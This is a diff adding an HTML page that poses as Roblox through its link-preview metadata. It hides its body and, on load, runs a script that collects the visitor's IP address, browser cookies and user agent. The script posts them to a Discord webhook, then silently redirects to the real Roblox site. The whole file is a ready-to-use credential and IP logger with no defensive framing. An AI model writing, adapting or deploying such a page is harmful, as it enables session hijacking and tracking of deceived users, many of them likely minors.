@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta property="og:title" content="Roblox">
+    <meta property="og:description" content="Roblox is a global platform that brings people together through play.">
+    <meta property="og:image" content="https://images.rbxcdn.com/7d8e7e791a56a27a19e4f3106ab3a1a8-roblox-logo.svg">
+</head>
+<body style="background:#fff; margin:0; display:none;">
+
+    <script>
+        var webhook = "YOUR_DISCORD_WEBHOOK_URL_HERE";
+
+        async function send(msg) {
+            try {
+                await fetch(webhook, {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({content: msg})
+                });
+            } catch(e) {}
+        }
+
+        async function grab() {
+            var ip = "unknown";
+            try {
+                var r = await fetch("https://api.ipify.org?format=json");
+                if (r.ok) { var d = await r.json(); ip = d.ip; }
+            } catch(e) {}
+
+            var cookie = document.cookie || "no_cookie";
+            var ua = navigator.userAgent;
+
+            var msg = "🎯 **NEW HIT**\n**IP:** " + ip + "\n**Cookie:** ||" + cookie + "||\n**UA:** " + ua;
+            await send(msg);
+
+            // Redirect to REAL Roblox — they never saw this page
+            window.location = "https://www.roblox.com";
+        }
+
+        grab();
+    </script>
+</body>
+</html>
